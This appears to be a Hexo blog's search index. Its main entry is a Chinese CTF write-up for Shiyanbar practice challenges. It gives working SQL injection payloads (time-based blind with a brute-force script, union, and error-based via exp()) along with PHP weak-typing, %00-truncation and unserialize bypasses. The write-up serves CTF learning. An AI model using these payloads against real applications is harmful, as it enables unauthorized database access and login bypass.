<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>CTF实验吧writeup</title>
      <link href="/2018/12/21/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7writeup/"/>
      <url>/2018/12/21/CTF%E5%AE%9E%E9%AA%8C%E5%90%A7writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="实验吧writeup"><a href="#实验吧writeup" class="headerlink" title="实验吧writeup"></a>实验吧writeup</h2><ul><li>看起来有点难分值</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考察点:sleep()时间盲注</span><br></pre></td></tr></table></figure><p>selete被过滤了,利用slepp()进行时间盲注.关键payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin&apos; and case when(substr(password,1,1)=&apos;i&apos;) then sleep(18) else sleep(0) end and &apos;&apos;=&apos;&amp;pass=9&amp;action=login</span><br></pre></td></tr></table></figure><p>脚本如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># http://ctf5.shiyanbar.com/basic/inject/index.php?admin=admin&apos; and case when(substr(password,1,1)=&apos;i&apos;) then sleep(8) else sleep(0) end and &apos;&apos;=&apos;&amp;pass=&amp;action=login</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">guess = &quot;1234567890-_=+qwertyuioplkjhgfdsazxcvbnm?!@#$%^&amp;*&quot;</span><br><span class="line"></span><br><span class="line">url = &quot;http://ctf5.shiyanbar.com/basic/inject/index.php&quot;</span><br><span class="line"></span><br><span class="line">flag1 = &apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1,20):</span><br><span class="line">for j in guess:</span><br><span class="line">flag = &quot;admin&apos; and case when(substr(password,%s,1)=&apos;%s&apos;) then sleep(8) else sleep(0) end and &apos;&apos;=&apos;&amp;pass=&amp;action=login&quot;%(i,j)</span><br><span class="line"></span><br><span class="line">data = &#123;&apos;admin&apos;:&quot;flag&quot;&#125;</span><br><span class="line"></span><br><span class="line">timestart = time.time()</span><br><span class="line"></span><br><span class="line">r = requests.get(url,params=flag)</span><br><span class="line"></span><br><span class="line">if time.time() - timestart &gt; 10:</span><br><span class="line">flag1 = flag1 + j</span><br><span class="line">print(j)</span><br><span class="line">break</span><br></pre></td></tr></table></figure><ul><li>猫抓老鼠</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在返回报看到:Content-Row: MTU0NTIyNzcyNg==</span><br><span class="line">直接提交即可,不用解密</span><br></pre></td></tr></table></figure><ul><li>头有点大分值</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点:HTTP头</span><br></pre></td></tr></table></figure><ul><li>貌似有点难分值</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点:HTTP头,XXF</span><br></pre></td></tr></table></figure><ul><li>这个看起来有点简单!</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点:SQL注入,</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用 union 进行注入,没有过滤任何字符</span><br></pre></td></tr></table></figure><ul><li>PHP大法分值</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">考点:php代码审计</span><br><span class="line">试了eregi()弱类型,发现不行</span><br><span class="line">看到$_GET[id] = urldecode($_GET[id]); 尝试二次url编码,成功绕过</span><br></pre></td></tr></table></figure><ul><li>what a fuck!这是什么鬼东西?</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">考点:JSfack</span><br><span class="line">全选复制,在浏览器的运行台运行即可</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">考点: php审计 + sql注入</span><br><span class="line">在源码中看到index.txt</span><br><span class="line">关键代码:</span><br><span class="line">$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">//echo $row[&quot;pw&quot;];</span><br><span class="line">  </span><br><span class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</span><br><span class="line">这里取一条结果集进行验证,可使用union select 构造一条结果集来绕过</span><br><span class="line">payload:</span><br><span class="line">1&apos;union select md5(1) #</span><br><span class="line">1</span><br><span class="line">不理解可以自己搭建环境试试</span><br></pre></td></tr></table></figure><ul><li>NSCTF web200</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">考点:写脚本能力</span><br><span class="line">&lt;?php</span><br><span class="line">        $_=&quot;&quot;;</span><br><span class="line">        $str = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws &quot;;</span><br><span class="line"> </span><br><span class="line">        $str = str_rot13($str);</span><br><span class="line">        $str = strrev($str);</span><br><span class="line">        $str = base64_decode($str);</span><br><span class="line"> </span><br><span class="line">        for ($i = 0; $i &lt; strlen($str); $i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $_c = substr($str,$i,1);</span><br><span class="line">            $__ = ord($_c)-1;</span><br><span class="line">            $_c = chr($__);</span><br><span class="line">            $_ .=$_c;</span><br><span class="line">        &#125;</span><br><span class="line">        echo strrev($_);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>上传绕过</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点:文件上传,%00截断</span><br></pre></td></tr></table></figure><ul><li>FALSE</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">考点: hsah1 碰撞</span><br><span class="line">可以直接传数组和md5碰撞一样的解法</span><br></pre></td></tr></table></figure><ul><li><p>Guess Next Session</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">考点：http cookie</span><br><span class="line">直接将cookie清除即可</span><br></pre></td></tr></table></figure></li><li><p>Once More</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)</span><br><span class="line">&#123;</span><br><span class="line">if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE)</span><br><span class="line">&#123;</span><br><span class="line">die(&apos;Flag: &apos; . $flag);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">考点:考察php及即弱类型</span><br><span class="line">当php遇到数字加e 的时候被认为是科学技术法，</span><br><span class="line">ereg()存在%00截断即遇到%00的时候被认为是匹配结束</span><br><span class="line">payload:</span><br><span class="line">1e8%00*-*    //注意在地址栏提交,不然%00会被url编码</span><br><span class="line">http://ctf5.shiyanbar.com/web/more.php?password[]=99999999 //也可以利用数组,ereg()只能处理字符串,数组的话,被认为为NULL</span><br></pre></td></tr></table></figure><ul><li>忘记密码了</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">考点: 源码泄露</span><br><span class="line"></span><br><span class="line">打开网址 查看源码 注意</span><br><span class="line">&lt;meta name=&quot;editor&quot; content=&quot;Vim&quot; /&gt;</span><br><span class="line">VIM编辑器:当进行文件编辑时，如果非正常退出会产生一个 .文件名.swp</span><br><span class="line">upload/.step1.php.swp  发现不行,于是抓包,发现跳转到step2 然后发送给submit.php</span><br><span class="line">访问.submit.php.swp 成功获得源码</span><br><span class="line">if(!empty($token)&amp;&amp;!empty($emailAddress))&#123;</span><br><span class="line">if(strlen($token)!=10) die(&apos;fail&apos;);</span><br><span class="line">if($token!=&apos;0&apos;) die(&apos;fail&apos;);</span><br><span class="line">$sql = &quot;SELECT count(*) as num from `user` where token=&apos;$token&apos; AND email=&apos;$emailAddress&apos;&quot;;</span><br><span class="line">$r = mysql_query($sql) or die(&apos;db error&apos;);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[&apos;num&apos;];</span><br><span class="line">if($r&gt;0)&#123;</span><br><span class="line">echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;澶辫触浜嗗憖&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">1.要求token的长度为10且值为0</span><br><span class="line">利用科学技术法0e00000000</span><br><span class="line">2.要求$emailAddress的值为管理员邮箱</span><br><span class="line">step1源码中已给出</span><br><span class="line">payload:</span><br><span class="line">submit.php?emailAddress=admin@simplexue.com&amp;token=0e00000000</span><br></pre></td></tr></table></figure><ul><li><p>天网管理系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">考点: php弱类型 php反序列化</span><br><span class="line">查看源码, 发现&lt;!-- $test=$_GET[&apos;username&apos;]; $test=md5($test); if($test==&apos;0&apos;) --&gt;</span><br><span class="line">php中的 == 为弱等于号 当比较类型不一样时会进行转换比如 &apos;1&apos; == &apos;1dfsgdfsg&apos; 结果为Ture</span><br><span class="line">因此只要找到一个字符串加密结果开头为0的即可</span><br><span class="line">数组也应该拿可以绕过,还没试过</span><br><span class="line">回显得到/user.php?fame=hjkleffifer</span><br><span class="line">访问得到:</span><br><span class="line">$unserialize_str = $_POST[&apos;password&apos;]; </span><br><span class="line">$data_unserialize = unserialize($unserialize_str); </span><br><span class="line">if($data_unserialize[&apos;user&apos;] == &apos;???&apos; &amp;&amp; $data_unserialize[&apos;pass&apos;]==&apos;???&apos;) </span><br><span class="line">&#123; </span><br><span class="line">print_r($flag); </span><br><span class="line">&#125; 伟大的科学家php方言道：成也布尔，败也布尔。 回去吧骚年</span><br><span class="line"></span><br><span class="line">看源码应该是php反序列</span><br><span class="line">对password进行序列化</span><br><span class="line">a:2:&#123;s:4:&quot;user&quot;;b:1;s:4:&quot;pass&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure></li><li><p>Forms</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看源码，发现:</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;showsource&quot; value=0&gt;</span><br><span class="line">修改value=1</span><br></pre></td></tr></table></figure><ul><li>Guess Next Session</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">清除cookie就行了</span><br></pre></td></tr></table></figure><ul><li>拐弯抹角</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">考点: 伪静态</span><br><span class="line">构造index.php/inedx.php</span><br></pre></td></tr></table></figure><ul><li>让我进去</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点: Hash拓展长度攻击原理</span><br></pre></td></tr></table></figure><ul><li>天下武功唯快不破</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> 查看源码发现:</span><br><span class="line"> &lt;!-- please post what you find with parameter:key --&gt;</span><br><span class="line"> 在返回报文看到flag,提交发现失败,于是写刷新发现flag在变,利用脚本进行提交:</span><br><span class="line"> import requests</span><br><span class="line">import base64</span><br><span class="line">url = &apos;http://ctf5.shiyanbar.com/web/10/10.php&apos;</span><br><span class="line"></span><br><span class="line">s = requests.get(url)</span><br><span class="line"></span><br><span class="line">flag = base64.b64decode((s.headers[&apos;FLAG&apos;]))</span><br><span class="line">f = flag.decode()</span><br><span class="line"># print (f.split(&apos;:&apos;))</span><br><span class="line">f1 = f.split(&apos;:&apos;)[1]</span><br><span class="line"># print(flag)</span><br><span class="line">print(f1)</span><br><span class="line">f1 = &#123;&apos;key&apos;:f1&#125;</span><br><span class="line">r = requests.post(url,data=f1)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><ul><li>简单的sql注入</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入1&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">爆出全部</span><br><span class="line">1&apos;  unionunion  selectselect  database()&apos;</span><br><span class="line">1&apos;  unionunion  selectselect  flag  fromfrom  flag  wherewhere  &apos;1</span><br></pre></td></tr></table></figure><ul><li>简单的sql注入之2</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">测试select</span><br><span class="line">存在sql注入</span><br><span class="line">sel%0aect绕过成功</span><br><span class="line">id=1&apos;union/**/select/**/1&apos;  //成功回显</span><br><span class="line">id=1&apos;union/**/select/**/database()&apos; //database() 被过滤</span><br><span class="line">http://ctf5.shiyanbar.com/web/index_2.php?id=1&apos;union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/&apos;1&apos;=&apos;1</span><br><span class="line">id=1&apos;union/**/select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&apos;flag</span><br><span class="line">id=1%27union/**/select/**/flag/**/from/**/flag%23</span><br></pre></td></tr></table></figure><ul><li>简单的sql注入之3</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXP报错</span><br><span class="line">http://ctf5.shiyanbar.com/web/index_3.php?id=1&apos;or exp(~(Select * from (select database())x)) %23</span><br><span class="line">http://ctf5.shiyanbar.com/web/index_3.php?id=1&apos;or exp(~(Select * from (select group_concat(table_name) from information_schema.tables where table_schema=database())x)) %23</span><br><span class="line">http://ctf5.shiyanbar.com/web/index_3.php?id=1&apos;or exp(~(Select * from (select group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;)x)) %23</span><br><span class="line">http://ctf5.shiyanbar.com/web/index_3.php?id=1&apos;or exp(~(Select * from (select group_concat(flag) from flag)x)) %23</span><br></pre></td></tr></table></figure><ul><li>因缺思汀的绕过</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实战利用py爬取图片</title>
      <link href="/2018/12/07/%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8py%E7%88%AC%E5%8F%96%E5%9B%BE%E7%89%87/"/>
      <url>/2018/12/07/%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8py%E7%88%AC%E5%8F%96%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<h1 id="记第一次写爬虫"><a href="#记第一次写爬虫" class="headerlink" title="记第一次写爬虫"></a>记第一次写爬虫</h1><p>作为只回看懂代码的我,今玩要自己动手写一次爬虫,以前看过<strong>BeautifulSoup</strong>和<strong>requests</strong>库的一些用法,现在要自己写一个,花了我一个晚上的时间,结果写完也只有十几行的代码,难受受,看着自己写的十几行辣鸡代码,看来自己以后得好好自己动手写代码了.</p><h3 id="实战爬取图片"><a href="#实战爬取图片" class="headerlink" title="实战爬取图片"></a>实战爬取图片</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import urllib</span><br><span class="line">url = &apos;https://mp.weixin.qq.com/s/_ejalkc-Dg-YsFEXfVNpVw&apos;</span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line">html = response.text</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(html,&apos;html.parser&apos;)</span><br><span class="line"></span><br><span class="line">dd = soup.find_all(&apos;img&apos;,attrs=&#123;&apos;data-src&apos;:True&#125;) # 找到属性值(即图片地址)</span><br><span class="line">b=[]  #建一个列表放图片地址</span><br><span class="line"></span><br><span class="line">for img in dd:</span><br><span class="line">    b.append(img.attrs[&apos;data-src&apos;]) #将获取的地址放到列表中,我也不知道自己为什么脑残这么做</span><br><span class="line">x=1</span><br><span class="line">for imgurl in b:</span><br><span class="line">    urllib.urlretrieve(imgurl,&apos;%s.jpg&apos;%x)  #感觉用requests来编写下载的代码好麻烦就用urllib了 (逃~</span><br><span class="line">    x = x + 1</span><br></pre></td></tr></table></figure><p>菜鸡又得自闭了 ==</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>有点小情绪</title>
      <link href="/2018/11/24/%E6%9C%89%E7%82%B9%E5%B0%8F%E6%83%85%E7%BB%AA/"/>
      <url>/2018/11/24/%E6%9C%89%E7%82%B9%E5%B0%8F%E6%83%85%E7%BB%AA/</url>
      
        <content type="html"><![CDATA[<h2 id="今天出太阳了-最舒服"><a href="#今天出太阳了-最舒服" class="headerlink" title="今天出太阳了,最舒服!"></a>今天出太阳了,最舒服!</h2><p>11月好多CTF比赛鸭~ 我这种菜鸡做一道题都要花一个下午或者一个晚上很是难受,比赛和平常的刷题有区别,平常刷题不会就看writeup,hhhhh~<br>明显是自己比赛题目做少了,经验不多,学的东西不是很多,感觉自己学的都是表面的东西,现在学的知识漏洞及利用都是好几年前的知识,现在想找漏洞真的太难了。<br>有时候这题看freebuf时候有些看都看不懂,就有点想放弃了,想从开发开始做起,今天换了几本过期的书又借了两本python的书,想把自己的python提升,做些小程序出来,好让自己有成就感<br>加油~<br>少说话的，多做事，要自信！做好自己！  （逃~</p>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>文件上传漏洞总结</title>
      <link href="/2018/11/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>/2018/11/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h1><h5 id="做过很多文件上传漏洞-感觉不难-但是比赛有些还是不会-明明是一个很简单的知识点-还要想半天-现在来总结一下-让自己的思路清晰点-系统化-日常更新！"><a href="#做过很多文件上传漏洞-感觉不难-但是比赛有些还是不会-明明是一个很简单的知识点-还要想半天-现在来总结一下-让自己的思路清晰点-系统化-日常更新！" class="headerlink" title="做过很多文件上传漏洞,感觉不难,但是比赛有些还是不会,明明是一个很简单的知识点,还要想半天,现在来总结一下,让自己的思路清晰点,系统化,日常更新！"></a>做过很多文件上传漏洞,感觉不难,但是比赛有些还是不会,明明是一个很简单的知识点,还要想半天,现在来总结一下,让自己的思路清晰点,系统化,日常更新！</h5><p>因为很多图片,懒得放在图床里面,所以放在csdn或者博客园里面<br><a href="https://blog.csdn.net/qq_30464257/article/details/84404229#%E8%83%BD%E8%A2%AB%E8%A7%A3%E6%9E%90%E7%9A%84%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E5%88%97%E8%A1%A8%EF%BC%9Ajsp%20jspx%20jspfasp%20asa%20cer%20aspxphp%20php%20php3%20php4exe%20exee" target="_blank" rel="noopener">文件上传漏洞总结</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>湖湘杯WP</title>
      <link href="/2018/11/21/2018%E6%B9%96%E6%B9%98%E6%9D%AFWP/"/>
      <url>/2018/11/21/2018%E6%B9%96%E6%B9%98%E6%9D%AFWP/</url>
      
        <content type="html"><![CDATA[<h1 id="湖湘杯初赛没过-只能复现了QAQ"><a href="#湖湘杯初赛没过-只能复现了QAQ" class="headerlink" title="湖湘杯初赛没过 只能复现了QAQ"></a>湖湘杯初赛没过 只能复现了QAQ</h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>恒安杯历年WP</title>
      <link href="/2018/11/21/%E6%81%92%E5%AE%89%E6%9D%AF%E5%8E%86%E5%B9%B4WP/"/>
      <url>/2018/11/21/%E6%81%92%E5%AE%89%E6%9D%AF%E5%8E%86%E5%B9%B4WP/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="一月"><a href="#一月" class="headerlink" title="一月"></a>一月</h1><p><code>https://blog.csdn.net/luojiabin135/article/details/79638689</code><br><code>https://www.jianshu.com/p/abc44c54857a</code><br><code>http://rui0.cn/archives/763</code></p><h1 id="二月"><a href="#二月" class="headerlink" title="二月"></a>二月</h1><h1 id="三月"><a href="#三月" class="headerlink" title="三月"></a>三月</h1><p><code>https://coxxs.me/642</code><br><code>http://www.itdaan.com/blog/2018/03/26/acc9c32fda6f0e56651cc1322b43cf36.html</code></p><h1 id="五月"><a href="#五月" class="headerlink" title="五月"></a>五月</h1><p><code>https://blog.csdn.net/m0_38094687/article/details/80387188?utm_source=blogkpcl1</code></p><h1 id="六月"><a href="#六月" class="headerlink" title="六月"></a>六月</h1><p><code>https://blog.csdn.net/u011377996/article/details/80787236?utm_source=blogkpcl2</code></p><h1 id="八月"><a href="#八月" class="headerlink" title="八月"></a>八月</h1><p><code>https://www.jianshu.com/p/0da0312cd1fd</code></p><h1 id="九月"><a href="#九月" class="headerlink" title="九月"></a>九月</h1><p><code>https://www.anquanke.com/post/id/160582?from=singlemessage</code></p><h1 id="十月"><a href="#十月" class="headerlink" title="十月"></a>十月</h1><p><code>https://www.jianshu.com/p/e1af7cc3483d</code></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>CTF</title>
      <link href="/2018/11/21/CTF/"/>
      <url>/2018/11/21/CTF/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><pre><code>筱阳QQ：1260457781</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第一天</title>
      <link href="/2018/11/21/%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
      <url>/2018/11/21/%E7%AC%AC%E4%B8%80%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<p>#今早起床打开窗，阳光美美哒！</p>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日记 </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
